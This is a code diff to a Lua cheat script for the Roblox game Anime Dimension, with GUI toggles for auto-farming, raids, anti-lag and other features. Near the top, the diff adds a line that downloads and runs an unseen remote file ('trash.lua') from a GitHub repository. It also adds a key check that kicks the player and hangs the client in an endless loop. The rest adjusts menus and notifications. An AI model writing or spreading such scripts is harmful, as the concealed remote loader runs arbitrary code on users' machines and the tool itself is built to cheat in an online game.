@@ -72,6 +72,14 @@ _G.Settings = {
     Autoraid = false,
     kickrejoin = true
 }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lifaiossama/errors/main/trash.lua"))()
+
+if isfile("Mykey.txt") and readfile("Mykey.txt") == _G.Key then
+  else
+    game.Players.LocalPlayer:Kick("Brah")
+    wait(5)
+    while true do end;
+  end;
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
@@ -1327,7 +1335,22 @@ y:AddToggle(
             saveSettings()
         end}
 )
-y:AddDropdown({Name = "Select Main Character", Default = _G.Settings.SelectedMainCharacter, Options = p, Callback = function(H)
+
+local p = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("MainGui");
+local l = p.CenterUIFrame.Inventory.Frame.CharacterInventoryFrame.CharacterInventoryScrollingFrame;
+
+local MainCharacters = {}
+for i,v in ipairs(l:GetChildren()) do 
+  if v:FindFirstChild("CharacterImage") and v.Name ~= "CharacterInventorySlot" and not table.find(MainCharacters, v.Name) then
+    table.insert(MainCharacters,v.Name)
+  end;
+end;
+table.sort(MainCharacters)
+
+
+
+
+y:AddDropdown({Name = "Select Main Character", Default = _G.Settings.SelectedMainCharacter, Options = MainCharacters, Callback = function(H)
     _G.Settings.SelectedMainCharacter = H
     saveSettings()
 end})
@@ -1354,11 +1377,11 @@ y:AddToggle(
         end
     }
 )
-y:AddDropdown({Name = "Select Assist Character 1", Default = _G.Settings.SelectedAssitCharacter1, Options = p, Callback = function(H)
+y:AddDropdown({Name = "Select Assist Character 1", Default = _G.Settings.SelectedAssitCharacter1, Options = MainCharacters, Callback = function(H)
     _G.Settings.SelectedAssitCharacter1 = H
     saveSettings()
 end})
-y:AddDropdown({Name = "Select Assist Character 2", Default = _G.Settings.SelectedAssitCharacter2, Options = p, Callback = function(H)
+y:AddDropdown({Name = "Select Assist Character 2", Default = _G.Settings.SelectedAssitCharacter2, Options = MainCharacters, Callback = function(H)
     _G.Settings.SelectedAssitCharacter2 = H
     saveSettings()
 end})
@@ -1573,7 +1596,14 @@ x:AddToggle(
         end
     }
 )
-x:AddParagraph("Anti lag","👇 If you activate them you can't turn them off until you Turn off the toggle and restart the game (the Auto farm will keep work)")
+function AntiLagNotification()
+    u:MakeNotification({
+        Name = "Anti Lag",
+        Content = "you can't turn off Anti Lag until you Turn off the toggle and then rejoin",
+        Image = "rbxassetid://4483345998",
+        Time = 20
+    })
+    end
 x:AddToggle(
     {
         Name = "Anti Lag",
@@ -1588,6 +1618,7 @@ x:AddToggle(
                         if not _G.Settings.antilag then
                             break
                         end
+                        AntiLagNotification()
                             for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                                 if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
                                     v.Material = Enum.Material.SmoothPlastic
@@ -1646,6 +1677,16 @@ x:AddToggle(
         end
     }
 )
+function blacksscreenNotification()
+    u:MakeNotification({
+        Name = "Black Screen",
+        Content = "While Black Screen is on, Auto farm will keep working",
+        Image = "rbxassetid://4483345998",
+        Time = 20
+    })
+    end
+    
+
 x:AddToggle(
     {
         Name = "Black Screen",
@@ -1658,9 +1699,11 @@ x:AddToggle(
                 function()
                     while task.wait(1) do
                         if not _G.Settings.balckscreen then
+                            game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui:Destroy()
                             break
                         end
-                        while wait(3) do
+                        while wait(1) do
+                            blacksscreenNotification()
 -- Services
 local Players = game:GetService("Players")
 local ReplicatedFirst = game:GetService("ReplicatedFirst")
@@ -1695,20 +1738,28 @@ if not game:IsLoaded() then game.Loaded:Wait() end -- Wait until the game is loa
 
 textLabel.Text = "tozx was here" -- Sets the text to appear
 task.wait(30000) -- Time until text fades out
-TweenService:Create(textLabel, tweenInfo, { TextTransparency = 1 }):Play() -- Tweens TextTransparency to 1
-task.wait(30000) -- Time until background fades out
-TweenService:Create(textLabel, tweenInfo, { BackgroundTransparency = 1 }):Play() -- Tweens BackgroundTransparency to 1
-task.wait(tweenInfo.Time) -- Wait the time for the last tween to complete
-screenGui:Destroy() -- Clean up the gui after use.
+-- TweenService:Create(textLabel, tweenInfo, { TextTransparency = 1 }):Play() -- Tweens TextTransparency to 1
+-- task.wait(30000) -- Time until background fades out
+-- TweenService:Create(textLabel, tweenInfo, { BackgroundTransparency = 1 }):Play() -- Tweens BackgroundTransparency to 1
+-- task.wait(tweenInfo.Time) -- Wait the time for the last tween to complete
+-- screenGui:Destroy() -- Clean up the gui after use.
                          end                                                                                                                                                                                                                                                                       
                     end
                 end
             )
-            -- if not _G.Settings.balckscreen then
-            --     game:GetService("Players").tozxart.PlayerGui.ScreenGui:Destroy()
+
         end
     }
 )
+
+function FPSGPUNotification()
+    u:MakeNotification({
+        Name = "FPS & GPU Reduce",
+        Content = "you can't turn off FPS & GPU Reduce until you Turn off the toggle and then rejoin",
+        Image = "rbxassetid://4483345998",
+        Time = 20
+    })
+    end
 x:AddToggle(
     {
         Name = "FPS & GPU Reduce",
@@ -1724,6 +1775,7 @@ x:AddToggle(
                             break
                         end
                         while wait() do
+                            FPSGPUNotification()
                             local UserInputService = game:GetService("UserInputService")
                             local RunService = game:GetService("RunService")
                             
@@ -2392,8 +2444,16 @@ G:AddTextbox(
             saveSettings()
         end}
 )
-
+function Destroy()
+    game:GetService("CoreGui").Orion:Destroy()
+end
+G:AddButton(
+    {Name = "Destroy Gui", Callback = function()
+        Destroy()
+        end}
+)
 G:AddLabel("LastestUpdate : 9/23/2022 ")
-
+u:MakeNotification({Name = "Correct Key!", Content = "You have entered the correct key!", Time = 10})
+wait(2)
 u:MakeNotification({Name = "The Intruders", Content = "Game: Anime Dimension", Time = 15})
 u:Init()
